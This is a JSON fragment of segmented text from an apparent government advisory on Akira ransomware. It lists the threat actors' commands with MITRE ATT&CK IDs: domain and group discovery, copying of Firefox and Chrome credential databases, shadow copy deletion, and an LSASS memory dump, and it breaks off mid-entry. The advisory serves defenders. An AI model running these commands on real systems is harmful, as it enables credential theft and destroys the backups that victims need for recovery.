  "units": {
    "u001": {
      "start": 0,
      "end": 21,
      "text": "test /dclist: [T1018]",
      "line_start": 0
    },
    "u002": {
      "start": 22,
      "end": 51,
      "text": "nltest /DOMAIN_TRUSTS [T1482]",
      "line_start": 22
    },
    "u003": {
      "start": 52,
      "end": 94,
      "text": "net group “Domain admins” /dom [T1069.002]",
      "line_start": 52
    },
    "u004": {
      "start": 95,
      "end": 143,
      "text": "net localgroup “Administrators” /dom [T1069.001]",
      "line_start": 95
    },
    "u005": {
      "start": 144,
      "end": 160,
      "text": "tasklist [T1057]",
      "line_start": 144
    },
    "u006": {
      "start": 161,
      "end": 169,
      "text": "Table 9.",
      "line_start": 161
    },
    "u007": {
      "start": 170,
      "end": 205,
      "text": "Commands Used for Credential Access",
      "line_start": 161
    },
    "u008": {
      "start": 206,
      "end": 214,
      "text": "Commands",
      "line_start": 206
    },
    "u009": {
      "start": 215,
      "end": 244,
      "text": "cmd.exe /Q /c esentutl.exe /y",
      "line_start": 215
    },
    "u010": {
      "start": 245,
      "end": 354,
      "text": "\"C:\\Users\\<username>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<firefox_profile_id>.defaultrelease\\key4.db\" /d",
      "line_start": 245
    },
    "u011": {
      "start": 355,
      "end": 465,
      "text": "\"C:\\Users\\<username>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<firefox_profile_id>.defaultrelease\\key4.db.tmp”",
      "line_start": 355
    },
    "u012": {
      "start": 466,
      "end": 534,
      "text": "Note: Akira threat actors use these commands to access Firefox data.",
      "line_start": 466
    },
    "u013": {
      "start": 535,
      "end": 564,
      "text": "cmd.exe /Q /c esentutl.exe /y",
      "line_start": 535
    },
    "u014": {
      "start": 565,
      "end": 646,
      "text": "\"C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /d",
      "line_start": 565
    },
    "u015": {
      "start": 647,
      "end": 729,
      "text": "\"C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.tmp”",
      "line_start": 647
    },
    "u016": {
      "start": 730,
      "end": 804,
      "text": "Note: Akira threat actors use these commands to access Google Chrome data.",
      "line_start": 730
    },
    "u017": {
      "start": 805,
      "end": 888,
      "text": "powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\" [T1490]",
      "line_start": 805
    },
    "u018": {
      "start": 889,
      "end": 1011,
      "text": "rundll32.exe c:\\Windows\\System32\\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\\windows\\temp\\lsass.dmp full [T1003.001]",
      "line_start": 889
    },
    "u019": {
      "start": 1012,
      "end": 1047,
      "text": "MITRE ATT&CK TACTICS AND TECHNIQUES",
      "line_start": 1012
    },
    "u020": {
      "start": 1048,
      "end": 1150,
      "text": "See Table 10 through Table 21 for all referenced threat actor tactics and techniques in this advisory.",
      "line_start": 1048
    },
    "u021": {
      "start": 1151,
      "end": 1327,
      "text": "For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.",
      "line_start": 1048
    },
    "u022": {
      "start": 1328,
      "end": 1337,
      "text": "Table 10.",
      "line_start": 1328
    },
    "u023": {
      "start": 1338,
